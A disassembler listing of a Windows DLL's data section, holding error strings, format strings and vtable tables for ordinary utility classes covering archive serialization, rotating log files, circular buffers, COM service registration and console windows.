aCarchiveWrit_5	db 'CArchive::WriteVariantObject() : GlobalLock() == NULL',0Ah,0
					; DATA XREF: Ordinal380+DCo
		align 10h
; char aCarchiveWrit_4[]
aCarchiveWrit_4	db 'CArchive::WriteVariantObject() : OleSaveToStream() != S_OK, 0x%08'
					; DATA XREF: Ordinal380+8Ao
		db 'X',0Ah,0
; char aCarchiveWrit_3[]
aCarchiveWrit_3	db 'CArchive::WriteVariantObject() : piPersistStream == NULL',0Ah,0
					; DATA XREF: Ordinal380:loc_6AF3A47Do
		align 10h
; char aCarchiveRea_25[]
aCarchiveRea_25	db 'CArchive::Read(::ATL::CAtlStringA&) : Read() == FALSE',0Ah,0
					; DATA XREF: Ordinal340+84o
		align 4
aCarchiveRea_24	db 'CArchive::Read(::ATL::CAtlStringA&)',0
					; DATA XREF: Ordinal340:loc_6AF3A622o
; char aCarchiveReadAt[]
aCarchiveReadAt	db 'CArchive::Read(::ATL::CAtlStringA&) : PeekSize() == FALSE',0Ah,0
					; DATA XREF: Ordinal340+39o
		align 4
; char aCarchiveRea_28[]
aCarchiveRea_28	db 'CArchive::Read(::ATL::CAtlStringW&) : Read() == FALSE',0Ah,0
					; DATA XREF: Ordinal341+87o
		align 10h
aCarchiveRea_27	db 'CArchive::Read(::ATL::CAtlStringW&)',0
					; DATA XREF: Ordinal341:loc_6AF3A793o
; char aCarchiveRea_26[]
aCarchiveRea_26	db 'CArchive::Read(::ATL::CAtlStringW&) : Peek() == FALSE',0Ah,0
					; DATA XREF: Ordinal341+39o
		align 4
aCarchiveWri_14	db 'CArchive::WriteVariant() : WriteVariantObject() == FALSE',0Ah,0
					; DATA XREF: Ordinal372+F3o
		align 4
aCarchiveWri_13	db 'CArchive::WriteVariant() : WriteVariantString() == FALSE',0Ah,0
					; DATA XREF: Ordinal372+B8o
		align 4
aCarchiveWri_12	db 'CArchive::WriteVariant() : WriteVariantArray() == FALSE',0Ah,0
					; DATA XREF: Ordinal372+8Eo
		align 10h
; char aCarchiveWri_11[]
aCarchiveWri_11	db 'CArchive::WriteVariant() : WriteVariantBuffer() == FALSE',0Ah,0
					; DATA XREF: Ordinal372+6Eo
		align 4
; char aCarchiveWri_10[]
aCarchiveWri_10	db 'CArchive::WriteVariant() : WriteEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal372+38o
					; Ordinal372+CBo
		align 4
; char aCarchiveWrit_9[]
aCarchiveWrit_9	db 'CArchive::WriteVariant() : IsVariantSupported() == FALSE',0Ah,0
					; DATA XREF: Ordinal372+14o
		align 4
; char aCarchiveWri_18[]
aCarchiveWri_18	db 'CArchive::WriteVariantArray() : varArray.Reference() == FALSE',0Ah,0
					; DATA XREF: Ordinal374:loc_6AF3AAD0o
		align 4
; char aCarchiveWri_17[]
aCarchiveWri_17	db 'CArchive::WriteVariantArray() : WriteVariant() == FALSE',0Ah,0
					; DATA XREF: Ordinal374:loc_6AF3AAB7o
		align 4
aCarchiveWri_16	db 'CArchive::WriteVariantArray() : varArray.Lock() == FALSE',0Ah,0
					; DATA XREF: Ordinal374+70o
		align 10h
aCarchiveWri_15	db 'CArchive::WriteVariantArray() : WriteEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal374+57o
; char aCarchiveWri_21[]
aCarchiveWri_21	db 'CArchive::Write(LPCVARIANT) : WriteVariant() == FALSE',0Ah,0
					; DATA XREF: Ordinal343+ADo
		align 10h
aCarchiveWri_20	db 'CArchive::Write(LPCVARIANT) : dummyArchive.WriteVariant() == FALS'
					; DATA XREF: Ordinal343+78o
		db 'E',0Ah,0
; char aCarchiveWri_19[]
aCarchiveWri_19	db 'CArchive::Write(LPCVARIANT) : WriteEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal343+3Ao
					; Ordinal343+90o
		align 4
; char aCarchiveWriteL[]
aCarchiveWriteL	db 'CArchive::Write(LPCVARIANT) : m_eArchiveType != eWriteArchive',0Ah,0
					; DATA XREF: Ordinal343+Fo
		align 4
off_6AF58338	dd offset aSunday	; DATA XREF: Ordinal408+6Er
					; "Sunday"
		dd offset aMonday	; "Monday"
		dd offset aTuesday	; "Tuesday"
		dd offset aWednesday	; "Wednesday"
		dd offset aThursday	; "Thursday"
		dd offset aFriday	; "Friday"
		dd offset aSaturday	; "Saturday"
aSaturday	db 'Saturday',0         ; DATA XREF: .rdata:6AF58350o
		align 10h
aFriday		db 'Friday',0           ; DATA XREF: .rdata:6AF5834Co
		align 4
aThursday	db 'Thursday',0         ; DATA XREF: .rdata:6AF58348o
		align 4
aWednesday	db 'Wednesday',0        ; DATA XREF: .rdata:6AF58344o
		align 10h
aTuesday	db 'Tuesday',0          ; DATA XREF: .rdata:6AF58340o
aMonday		db 'Monday',0           ; DATA XREF: .rdata:6AF5833Co
		align 10h
aSunday		db 'Sunday',0           ; DATA XREF: .rdata:off_6AF58338o
		align 4
; char aCautocyclelogf[]
aCautocyclelogf	db 'CAutoCycleLogFile::Clear() : m_File.SetLength() == FALSE',0Ah,0
					; DATA XREF: Ordinal391+29o
		align 4
off_6AF583D4	dd offset sub_6AF3AF33	; DATA XREF: Ordinal383+3o
					; Ordinal382+6o
		dd offset Ordinal406
; char pszTrimChars[3]
pszTrimChars	db 0Dh,0Ah,0		; DATA XREF: Ordinal406+55o
					; Ordinal393:loc_6AF3B8E3o ...
		align 10h
; unsigned __int8 asc_6AF583E0
asc_6AF583E0	db ' ',0                ; DATA XREF: Ordinal406+50o
					; Ordinal460+43o
		align 4
; unsigned __int8 dword_6AF583E4
dword_6AF583E4	dd 8070920h, 0A0D0B0Ch,	0 ; DATA XREF: Ordinal406+6o
; char dword_6AF583F0[]
dword_6AF583F0	dd 2Eh			; DATA XREF: Ordinal408+147o
; char SubBlock[2]
SubBlock	db '\',0                ; DATA XREF: Ordinal408+11Ao
					; Ordinal1525+EFo
		align 4
; char a_0Dlu[]
a_0Dlu		db '_%%0%dlu',0         ; DATA XREF: Ordinal408+D2o
		align 4
; char a_04d02d02d[]
a_04d02d02d	db '_%04d%02d%02d',0    ; DATA XREF: Ordinal408+8Eo
		align 4
a_S		db '_%s',0              ; DATA XREF: Ordinal408+75o
; char a_02d[]
a_02d		db '_%02d',0            ; DATA XREF: Ordinal408+57o
		align 10h
aCautocyclelo_0	db 'CAutoCycleLogFile::BuildFileName()',0 ; DATA XREF: Ordinal408+27o
		align 4
; char aCautocyclelo_3[]
aCautocyclelo_3	db 'CAutoCycleLogFile::Open() : m_File.SeekToEnd() == FALSE',0Ah,0
					; DATA XREF: Ordinal409+65o
		align 10h
aCautocyclelo_2	db 'CAutoCycleLogFile::Open() : m_File.Open() == FALSE',0Ah,0
					; DATA XREF: Ordinal409+53o
; char aCautocyclelo_1[]
aCautocyclelo_1	db 'CAutoCycleLogFile::Open() : BuildFileName() == FALSE',0Ah,0
					; DATA XREF: Ordinal409+19o
		align 4
; char aCautocyclelo_5[]
aCautocyclelo_5	db 'CAutoCycleLogFile::Open() : szDirectory == NULL',0Ah,0
					; DATA XREF: Ordinal389:loc_6AF3B7CBo
		align 10h
aCautocyclelo_4	db 'CAutoCycleLogFile::Open()',0 ; DATA XREF: Ordinal389+76o
		align 4
; char aCautocyclelo_7[]
aCautocyclelo_7	db 'CAutoCycleLogFile::LogEx() : m_File.Write() == FALSE',0Ah,0
					; DATA XREF: Ordinal407+4Co
		align 4
; char aCautocyclelo_6[]
aCautocyclelo_6	db 'CAutoCycleLogFile::LogEx() : CycleLogFile() == FALSE',0Ah,0
					; DATA XREF: Ordinal407+24o
		align 4
; char aCautocyclelo_9[]
aCautocyclelo_9	db 'CAutoCycleLogFile::LogV() : Filter() == FALSE',0Ah,0
					; DATA XREF: Ordinal393+5Ao
		align 4
aCautocyclelo_8	db 'CAutoCycleLogFile::LogV',0 ; DATA XREF: Ordinal393+2Co
; char aLd[]
aLd		db '%ld',0              ; DATA XREF: Ordinal384+7o
					; Ordinal504+7o
; char asc_6AF585F8[]
asc_6AF585F8	db '%f',0               ; DATA XREF: Ordinal385+Co
					; Ordinal505+Co
		align 4
; char aLu[]
aLu		db '%lu',0              ; DATA XREF: Ordinal386+7o
					; Ordinal506+7o
; char aC[]
aC		db '%c',0               ; DATA XREF: Ordinal387+9o
					; Ordinal507+9o
		align 4
; char aS[]
aS		db '%s',0               ; DATA XREF: Ordinal388+7o
					; Ordinal508+7o
		align 4
off_6AF58608	dd offset sub_6AF3BF9B	; DATA XREF: Ordinal411+6o
					; Ordinal412+3o
; char aCcircularbuffe[]
aCcircularbuffe	db 'CCircularBuffer::Create() : m_Buffer.Alloc() == NULL',0Ah,0
					; DATA XREF: Ordinal413+31o
		align 4
; char aCcircularbuf_2[]
aCcircularbuf_2	db 'CCircularBuffer::ReadEx() : WriteFile() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal423+87o
		align 10h
; char aCcircularbuf_1[]
aCcircularbuf_1	db 'CCircularBuffer::ReadEx() : m_nDataSize < nSize',0Ah,0
					; DATA XREF: Ordinal423+29o
		align 4
; char aCcircularbuf_0[]
aCcircularbuf_0	db 'CCircularBuffer::ReadEx() : m_pBufferBegin == NULL',0Ah,0
					; DATA XREF: Ordinal423+Eo
; char aCcircularbuf_5[]
aCcircularbuf_5	db 'CCircularBuffer::WriteEx() : ReadFile() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal424+110o
		align 8
; char aCcircularbuf_4[]
aCcircularbuf_4	db 'CCircularBuffer::WriteEx() : m_nDataSize + nSize > m_Buffer.GetSi'
					; DATA XREF: Ordinal424+36o
		db 'ze()',0Ah,0
		align 10h
; char aCcircularbuf_3[]
aCcircularbuf_3	db 'CCircularBuffer::WriteEx() : m_pBufferBegin == NULL',0Ah,0
					; DATA XREF: Ordinal424+Fo
		align 4
off_6AF587A8	dd offset sub_6AF3C72E	; DATA XREF: Ordinal425+30o
					; Ordinal426+3o
		dd offset Ordinal441
		dd offset Ordinal610
; char aCcircularstore[]
aCcircularstore	db 'CCircularStore::WriteOffset() : WriteHeader() == FALSE',0Ah,0
					; DATA XREF: Ordinal442+11o
; char aCcircularsto_0[]
aCcircularsto_0	db 'CCircularStore::ReadOffset() : ReadHeader() == FALSE',0Ah,0
					; DATA XREF: Ordinal443+27o
		align 4
; char aCcircularsto_2[]
aCcircularsto_2	db 'CCircularStore::Close() : CDataStore::Close() == FALSE',0Ah,0
					; DATA XREF: Ordinal431+56o
; char aCcircularsto_1[]
aCcircularsto_1	db 'CCircularStore::Close() : WriteOffset() == FALSE',0Ah,0
					; DATA XREF: Ordinal431+3Eo
		align 10h
; char aCcircularsto_3[]
aCcircularsto_3	db 'CCircularStore::Clear() : WriteOffset() == FALSE',0Ah,0
					; DATA XREF: Ordinal432+49o
		align 4
; char aCcircularst_10[]
aCcircularst_10	db 'CCircularStore::Add() : dwSize == 0',0Ah,0
					; DATA XREF: Ordinal433:loc_6AF3C518o
		align 4
aCcircularsto_9	db 'CCircularStore::Add() : WriteIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal433:loc_6AF3C511o
		align 4
aCcircularsto_8	db 'CCircularStore::Add() : WriteOffset() == FALSE',0Ah,0
					; DATA XREF: Ordinal433+335o
aCcircularsto_7	db 'CCircularStore::Add() : ReadIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal433:loc_6AF3C44Fo
		align 4
aCcircularsto_6	db 'CCircularStore::Add() : m_File.SetLength() == FALSE',0Ah,0
					; DATA XREF: Ordinal433:loc_6AF3C445o
		align 4
; char aCdatastoreAddU[]
aCdatastoreAddU	db 'CDataStore::Add() : uBlockSize > DWORD(-1)',0Ah,0
					; DATA XREF: Ordinal433+197o
					; Ordinal433:loc_6AF3C459o
aCcircularsto_5	db 'CCircularStore::Add() : m_File.GetLength() == FALSE',0Ah,0
					; DATA XREF: Ordinal433+8Fo
		align 4
aCcircularsto_4	db 'CCircularStore::Add() : dwSize + sizeof(HeaderInfo) + m_dwHeaderS'
					; DATA XREF: Ordinal433:loc_6AF3C220o
		db 'ize > m_uMaxSize',0Ah,0
		align 4
aCcircularst_15	db 'CCircularStore::ValidateFile() : offset.m_uOffset > uFileSize',0Ah,0
					; DATA XREF: Ordinal441:loc_6AF3C645o
		align 4
aCcircularst_14	db 'CCircularStore::ValidateFile() : ReadIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal441:loc_6AF3C63Bo
		align 4
; char aCcircularst_13[]
aCcircularst_13	db 'CCircularStore::ValidateFile() : m_File.GetLength() == FALSE',0Ah,0
					; DATA XREF: Ordinal441+5Fo
		align 4
; char aCcircularst_12[]
aCcircularst_12	db 'CCircularStore::ValidateFile() : ReadOffset() == FALSE',0Ah,0
					; DATA XREF: Ordinal441+28o
		align 10h
aCcircularst_11	db 'CCircularStore::ValidateFile() : CDataStore::ValidateFile() == FA'
					; DATA XREF: Ordinal441+12o
		db 'LSE',0Ah,0
		align 4
aCcircularst_18	db 'CCircularStore::SetMaxSize() : Clear() == FALSE',0Ah,0
					; DATA XREF: Ordinal430+98o
		align 4
aCcircularst_17	db 'CCircularStore::SetMaxSize() : m_File.GetLength() == FALSE',0Ah,0
					; DATA XREF: Ordinal430+75o
; char aCcircularst_16[]
aCcircularst_16	db 'CCircularStore::SetMaxSize() : uMaxSize < sizeof(HeaderInfo) m_dw'
					; DATA XREF: Ordinal430:loc_6AF3C6B6o
		db 'HeaderSize + sizeof(IndexInfo)',0Ah,0
		align 4
aCcircularst_21	db 'CCircularStore::Open() : SetMaxSize() == FALSE',0Ah,0
					; DATA XREF: Ordinal427+9Do
; char aCcircularst_20[]
aCcircularst_20	db 'CCircularStore::Open() : ReadOffset() == FALSE',0Ah,0
					; DATA XREF: Ordinal427+4Do
; char aCcircularst_19[]
aCcircularst_19	db 'CCircularStore::Open() : CDataStore::Open() == FALSE',0Ah,0
					; DATA XREF: Ordinal427+2Bo
		align 4
aCoinit_multith	db 'COINIT_MULTITHREADED',0 ; DATA XREF: Ordinal446+61o
		align 4
; char aCcoinitializeC[]
aCcoinitializeC	db 'CCoInitialize::CoInitialize() : %s',0Ah,0 ; DATA XREF: Ordinal446+47o
aCoinit_apartme	db 'COINIT_APARTMENTTHREADED',0 ; DATA XREF: Ordinal446+41o
		align 10h
; char aCcoinitializ_2[]
aCcoinitializ_2	db 'CCoInitialize::CoUninitialize() : GetExceptionCode() == EXCEPTION'
					; DATA XREF: Ordinal447+2Fo
		db '_ACCESS_VIOLATION',0Ah,0
		align 8
stru_6AF58DC8	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF3C8AA, \
					; DATA XREF: Ordinal447+2o
				   offset loc_6AF3C8BE>	; SEH scope table for function 6AF3C892
		align 8
; char aCcoinitializ_0[]
aCcoinitializ_0	db 'CCoInitialize::CCoInitialize() : CoInitialize() != S_OK, 0x%08X',0Ah
					; DATA XREF: Ordinal444+39o
		db 0
		align 4
off_6AF58E1C	dd offset sub_6AF3C95B	; DATA XREF: Ordinal444+11o
					; Ordinal445+7o
; char aCcoinitializ_1[]
aCcoinitializ_1	db 'CCoInitialize::~CCoInitialize() : m_dwThreadId != GetCurrentThrea'
					; DATA XREF: Ordinal445:loc_6AF3C94Eo
		db 'dId()',0Ah,0
aInvalidVectorT	db 'invalid vector<T> subscript',0 ; DATA XREF: sub_6AF3C99D+Do
aVectorTTooLong	db 'vector<T> too long',0 ; DATA XREF: sub_6AF3C9DE+Do
					; sub_6AF4411B+Do ...
		align 4
; char aCcommandlineGe[]
aCcommandlineGe	db 'CCommandLine::Get(LPCTSTR) : pos->m_bSwitch != FALSE',0Ah,0
					; DATA XREF: Ordinal454:loc_6AF3CADCo
		align 10h
; char aCcommandline_0[]
aCcommandline_0	db 'CCommandLine::Get(long) : nIndex >= m_CommandVector.size()',0Ah,0
					; DATA XREF: Ordinal455+11o
off_6AF58F0C	dd offset sub_6AF3D7B7	; DATA XREF: Ordinal448+6o
					; Ordinal450+6o ...
; char aCcommandline_1[]
aCcommandline_1	db 'CCommandLine::ProcessCommand() : sCommand.GetLength() <= 1',0Ah,0
					; DATA XREF: Ordinal457+97o
aCcommandlinePr	db 'CCommandLine::ProcessCommand()',0 ; DATA XREF: Ordinal457+1Bo
		align 4
; char aCcommandline_2[]
aCcommandline_2	db 'CCommandLine::Tokenize() : sString.Find() == -1',0Ah,0
					; DATA XREF: Ordinal460+F6o
		align 10h
aCcommandlineTo	db 'CCommandLine::Tokenize()',0 ; DATA XREF: Ordinal460+18o
		align 4
; char aCcommandline_4[]
aCcommandline_4	db 'CCommandLine::Parse() : ProcessCommand() == FALSE',0Ah,0
					; DATA XREF: Ordinal451+147o
		align 10h
; char aCcommandline_3[]
aCcommandline_3	db 'CCommandLine::Parse() : Tokenize() == FALSE',0Ah,0
					; DATA XREF: Ordinal451+8Ao
		align 10h
asc_6AF59020	db '/-',0               ; DATA XREF: Ordinal451+43o
		align 4
aCcommandlinePa	db 'CCommandLine::Parse()',0 ; DATA XREF: Ordinal451+25o
		align 4
; char aCcommandlineCc[]
aCcommandlineCc	db 'CCommandLine::CCommandLine() : Parse() == FALSE',0Ah,0
					; DATA XREF: Ordinal449+37o
		align 10h
off_6AF59070	dd offset sub_6AF3DEDF	; DATA XREF: Ordinal463+Fo Ordinal464o
		dd offset _purecall
		dd offset Ordinal1100
		dd offset Ordinal1035
		dd offset Ordinal1036
		dd offset Ordinal1037
		dd offset Ordinal1038
		dd offset Ordinal1039
		dd offset Ordinal1044
		dd offset Ordinal1044
		dd offset Ordinal1044
		dd offset Ordinal1044
		dd offset Ordinal1044
		dd offset Ordinal1046
		dd offset Ordinal1046
		dd offset Ordinal1046
		dd offset Ordinal1046
		dd offset Ordinal1078
		dd offset Ordinal1079
		dd offset Ordinal1080
		dd offset Ordinal1094
		dd offset Ordinal1090
		dd offset Ordinal1091
		dd offset Ordinal1091
		dd offset Ordinal467
		dd offset Ordinal468
		dd offset Ordinal469
		dd offset Ordinal470
		dd offset Ordinal471
		dd offset Ordinal473
		dd offset Ordinal472
		align 10h
; char aCcomserviceReg[]
aCcomserviceReg	db 'CComService::RegisterStandalone() : m_pComModule->Register() != S'
					; DATA XREF: Ordinal474+14o
		db '_OK, 0x%08X',0Ah,0
		align 10h
; char aCcomserviceUnr[]
aCcomserviceUnr	db 'CComService::Unregister() : m_pComModule->Unregister() != S_OK, 0'
					; DATA XREF: Ordinal476+10o
		db 'x%08X',0Ah,0
; char aCcomserviceOnr[]
aCcomserviceOnr	db 'CComService::OnRunEmbedded() : RegisterStandalone() == FALSE',0Ah,0
					; DATA XREF: Ordinal467+Co
		align 4
; char aCcomserviceO_0[]
aCcomserviceO_0	db 'CComService::OnRegServer() : RegisterStandalone() == FALSE',0Ah,0
					; DATA XREF: Ordinal468+9o
; char aCcomserviceOnu[]
aCcomserviceOnu	db 'CComService::OnUnRegServer() : Unregister() == FALSE',0Ah,0
					; DATA XREF: Ordinal469+9o
		align 4
; char aCcomserviceO_1[]
aCcomserviceO_1	db 'CComService::OnRemoveService() : Unregister() == FALSE',0Ah,0
					; DATA XREF: Ordinal471+Co
; char aCcomserviceO_2[]
aCcomserviceO_2	db 'CComService::OnRunDebug() : RegisterStandalone() == FALSE',0Ah,0
					; DATA XREF: Ordinal473+Co
		align 10h
; char aCcomserviceR_0[]
aCcomserviceR_0	db 'CComService::RegisterService() : m_pComModule->Register() != S_OK'
					; DATA XREF: Ordinal475+16o
		db ', 0x%08X',0Ah,0
		align 10h
; char aCcomserviceO_3[]
aCcomserviceO_3	db 'CComService::OnInstallService() : RegisterStandalone() == FALSE',0Ah
					; DATA XREF: Ordinal470+2Ao
		db 0
		align 4
aCcomserviceOni	db 'CComService::OnInstallService() : RegisterService() == FALSE',0Ah,0
					; DATA XREF: Ordinal470+1Ao
		align 4
; char aCcomserviceO_5[]
aCcomserviceO_5	db 'CComService::OnRunService() : RegisterStandalone() == FALSE',0Ah,0
					; DATA XREF: Ordinal472+2Ao
		align 4
aCcomserviceO_4	db 'CComService::OnRunService() : RegisterService() == FALSE',0Ah,0
					; DATA XREF: Ordinal472+1Ao
		align 10h
		dd 2710h, 0
; char aCconsoleSettit[]
aCconsoleSettit	db 'CConsole::SetTitle() : lstrlen(szTitle) > CCDIMOF(m_szTitle) - 1',0Ah
					; DATA XREF: Ordinal482+2Co
		db 0
		align 4
; char aCconsoleInitin[]
aCconsoleInitin	db 'CConsole::InitInstance()',0Ah,0 ; DATA XREF: Ordinal497o
		align 4
; char aCconsoleExitin[]
aCconsoleExitin	db 'CConsole::ExitInstance()',0Ah,0 ; DATA XREF: Ordinal498o
		align 8
; char aCconsoleProc_0[]
aCconsoleProc_0	db 'CConsole::ProcessEvents() : ReadConsoleInput() == FALSE, 0x%08X',0Ah
					; DATA XREF: Ordinal500+D0o
		db 0
		align 10h
aCconsoleProces	db 'CConsole::ProcessEvents() : GetNumberOfConsoleInputEvents() == FA'
					; DATA XREF: Ordinal500+C2o
		db 'LSE, 0x%08X',0Ah,0
		align 10h
off_6AF59520	dd offset sub_6AF3E6D2	; DATA XREF: Ordinal477+Eo
					; Ordinal478+3o
		dd offset Ordinal1388
		dd offset Ordinal1389
		dd offset Ordinal499
		dd offset Ordinal497
		dd offset Ordinal498
		dd offset Ordinal490
		dd offset Ordinal490
		dd offset Ordinal490
		dd offset Ordinal490
		dd offset Ordinal490
		dd offset Ordinal1091
		dd offset Ordinal495
		dd offset Ordinal495
		dd offset Ordinal495
		dd offset Ordinal495
; char aCconsoleDest_1[]
aCconsoleDest_1	db 'CConsole::Destroy() : SetConsoleMode() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal481+7Ao
		align 10h
; char aCconsoleDest_0[]
aCconsoleDest_0	db 'CConsole::Destroy() : SetConsoleCtrlHandler() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal481+56o
; char aCconsoleDestro[]
aCconsoleDestro	db 'CConsole::Destroy() : Terminate() == FALSE',0Ah,0
					; DATA XREF: Ordinal481+18o
; char aCconsoleRun[]
aCconsoleRun	db 'CConsole::Run()',0Ah,0 ; DATA XREF: Ordinal499+7o
		align 10h
; char aCconsoleCrea_6[]
aCconsoleCrea_6	db 'CConsole::Create() : m_pOldInputStream == NULL, 0x%08X',0Ah,0
					; DATA XREF: Ordinal480+1B1o
aCconsoleCrea_5	db 'CConsole::Create() : GetConsoleMode() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal480+1A3o
aCconsoleCrea_4	db 'CConsole::Create() : SetConsoleCtrlHandler() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal480+190o
		align 10h
; char aCconsoleCrea_3[]
aCconsoleCrea_3	db 'CConsole::Create() : CThread::Create() == FALSE',0Ah,0
					; DATA XREF: Ordinal480+16Do
		align 8
aCconsoleCrea_2	db 'CConsole::Create() : GetConsoleScreenBufferInfo() == FALSE, 0x%08'
					; DATA XREF: Ordinal480+130o
		db 'X',0Ah,0
aCconsoleCrea_1	db 'CConsole::Create() : m_pInputStream == NULL, 0x%08X',0Ah,0
					; DATA XREF: Ordinal480+F6o
		align 4
; char Format[]
Format		db 'r',0                ; DATA XREF: Ordinal480+CCo
		align 4
aCconsoleCrea_0	db 'CConsole::Create() : AllocConsole() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal480+60o
		align 10h
; char aCconsoleCreate[]
aCconsoleCreate	db 'CConsole::Create() : IsCreated() != FALSE',0Ah,0
					; DATA XREF: Ordinal480+2Ao
		align 4
; char aCconsolewndP_2[]
aCconsolewndP_2	db 'CConsoleWnd::PrintLine() : szText == NULL',0Ah,0
					; DATA XREF: Ordinal515:loc_6AF3E823o
		align 4
; char aCconsolewndP_1[]
aCconsolewndP_1	db 'CConsoleWnd::PrintLine() : WriteConsoleOutputCharacter() == FALSE'
					; DATA XREF: Ordinal515+A8o
		db ', 0x%08X',0
		align 8
aCconsolewndP_0	db 'CConsoleWnd::PrintLine() : GetConsoleScreenBufferInfo() == FALSE,'
					; DATA XREF: Ordinal515+5Fo
		db ' 0x%08X',0
		align 8
; char aCconsolewndPri[]
aCconsolewndPri	db 'CConsoleWnd::PrintLine() : m_hScreenBuffer == INVALID_HANDLE_VALU'
					; DATA XREF: Ordinal515+1Fo
		db 'E',0Ah,0
; char aCconsolewndC_1[]
aCconsolewndC_1	db 'CConsoleWnd::Clear() : FillConsoleOutputCharacter() == FALSE',0Ah,0
					; DATA XREF: Ordinal516:loc_6AF3E8D8o
		align 4
aCconsolewndC_0	db 'CConsoleWnd::Clear() : GetConsoleScreenBufferInfo() == FALSE',0Ah,0
					; DATA XREF: Ordinal516+37o
		align 10h
aCconsolewndCle	db 'CConsoleWnd::Clear() : m_hScreenBuffer == INVALID_HANDLE_VALUE',0Ah,0
					; DATA XREF: Ordinal516+21o
; char aCconsolewndR_0[]
aCconsolewndR_0	db 'CConsoleWnd::RedirectIO() : m_pOutputStream == NULL, 0x%08X',0Ah,0
					; DATA XREF: Ordinal517+79o
		align 10h
; char aW[]
aW		db 'w',0                ; DATA XREF: Ordinal517+5Co
		align 8
; char aCconsolewndRed[]
aCconsolewndRed	db 'CConsoleWnd::RedirectIO() : m_hScreenBuffer == INVALID_HANDLE_VAL'
					; DATA XREF: Ordinal517+23o
		db 'UE',0Ah,0
		align 10h
; char aCconsolewndG_0[]
aCconsolewndG_0	db 'CConsoleWnd::GetPosition() : GetConsoleScreenBufferInfo() == FALS'
					; DATA XREF: Ordinal520+4Fo
		db 'E, 0x%08X',0
		align 10h
; char aCconsolewndGet[]
aCconsolewndGet	db 'CConsoleWnd::GetPosition() : m_hScreenBuffer == INVALID_HANDLE_VA'
					; DATA XREF: Ordinal520+2Co
		db 'LUE',0Ah,0
		align 4
; char aCconsolewndSet[]
aCconsolewndSet	db 'CConsoleWnd::SetPosition() : m_hScreenBuffer == INVALID_HANDLE_VA'
					; DATA XREF: Ordinal521+21o
		db 'LUE',0Ah,0
		align 10h
; char aCconsolewndG_2[]
aCconsolewndG_2	db 'CConsoleWnd::GetSize() : GetConsoleScreenBufferInfo() == FALSE, 0'
					; DATA XREF: Ordinal522+4Fo
		db 'x%08X',0Ah,0
; char aCconsolewndG_1[]
aCconsolewndG_1	db 'CConsoleWnd::GetSize() : m_hScreenBuffer == INVALID_HANDLE_VALUE',0Ah
					; DATA XREF: Ordinal522+2Co
		db 0
		align 10h
; char aCconsolewndS_1[]
aCconsolewndS_1	db 'CConsoleWnd::SetSize() : GetConsoleScreenBufferInfo() == FALSE, 0'
					; DATA XREF: Ordinal523+46o
		db 'x%08X',0Ah,0
; char aCconsolewndS_0[]
aCconsolewndS_0	db 'CConsoleWnd::SetSize() : m_hScreenBuffer == INVALID_HANDLE_VALUE',0Ah
					; DATA XREF: Ordinal523+21o
		db 0
		align 10h
; char aCconsolewndS_4[]
aCconsolewndS_4	db 'CConsoleWnd::SetDefaultColors() : GetConsoleScreenBufferInfo() =='
					; DATA XREF: Ordinal524+6Ao
		db ' FALSE, 0x%08X',0Ah,0
		align 8
aCconsolewndS_3	db 'CConsoleWnd::SetDefaultColors() : SetConsoleTextAttribute() == FA'
					; DATA XREF: Ordinal524+45o
		db 'LSE, 0x%08X',0Ah,0
		align 4
; char aCconsolewndS_2[]
aCconsolewndS_2	db 'CConsoleWnd::SetDefaultColors() : m_hScreenBuffer == INVALID_HAND'
					; DATA XREF: Ordinal524+21o
		db 'LE_VALUE',0Ah,0
		align 8
; char aCconsolewndS_6[]
aCconsolewndS_6	db 'CConsoleWnd::SetCursorVisible() : GetConsoleCursorInfo() == FALSE'
					; DATA XREF: Ordinal525+46o
		db ', 0x%08X',0Ah,0
		align 8
; char aCconsolewndS_5[]
aCconsolewndS_5	db 'CConsoleWnd::SetCursorVisible() : m_hScreenBuffer == INVALID_HAND'
					; DATA XREF: Ordinal525+21o
		db 'LE_VALUE',0Ah,0
		align 8
; char aCconsolewndG_4[]
aCconsolewndG_4	db 'CConsoleWnd::GetCursorVisible() : GetConsoleCursorInfo() == FALSE'
					; DATA XREF: Ordinal526+46o
		db ', 0x%08X',0Ah,0
		align 8
; char aCconsolewndG_3[]
aCconsolewndG_3	db 'CConsoleWnd::GetCursorVisible() : m_hScreenBuffer == INVALID_HAND'
					; DATA XREF: Ordinal526+21o
		db 'LE_VALUE',0Ah,0
		align 8
; char aCconsolewndC_3[]
aCconsolewndC_3	db 'CConsoleWnd::Create() : SetConsoleScreenBufferSize() == FALSE, 0x'
					; DATA XREF: Ordinal509+C4o
		db '%08X',0Ah,0
		align 10h
; char aCconsolewndC_2[]
aCconsolewndC_2	db 'CConsoleWnd::Create() : SetConsoleMode() == INVALID_HANDLE_VALUE,'
					; DATA XREF: Ordinal509+6Ao
		db ' 0x%08X',0Ah,0
		align 10h
; char aCconsolewndCre[]
aCconsolewndCre	db 'CConsoleWnd::Create() : CreateConsoleScreenBuffer() == INVALID_HA'
					; DATA XREF: Ordinal509+42o
		db 'NDLE_VALUE, 0x%08X',0Ah,0
		align 4
; char aCconsolewndA_0[]
aCconsolewndA_0	db 'CConsoleWnd::Activate() : SetConsoleActiveScreenBuffer() == FALSE'
					; DATA XREF: Ordinal514+42o
		db ', 0x%08X',0Ah,0
		align 8
; char aCconsolewndAct[]
aCconsolewndAct	db 'CConsoleWnd::Activate() : m_hScreenBuffer == INVALID_HANDLE_VALUE'
					; DATA XREF: Ordinal514+21o
		db 0Ah,0
		align 4
off_6AF5A00C	dd offset sub_6AF3EFF2	; DATA XREF: Ordinal501+Eo
					; Ordinal502+3o
aCconsolewndP_3	db 'CConsoleWnd::PrintV',0 ; DATA XREF: Ordinal519+49o
aCconsolewndS_7	db 'CConsoleWnd::SetTitle',0 ; DATA XREF: Ordinal527+31o
		align 4
off_6AF5A03C	dd offset unknown_libname_5 ; DATA XREF: Ordinal533o
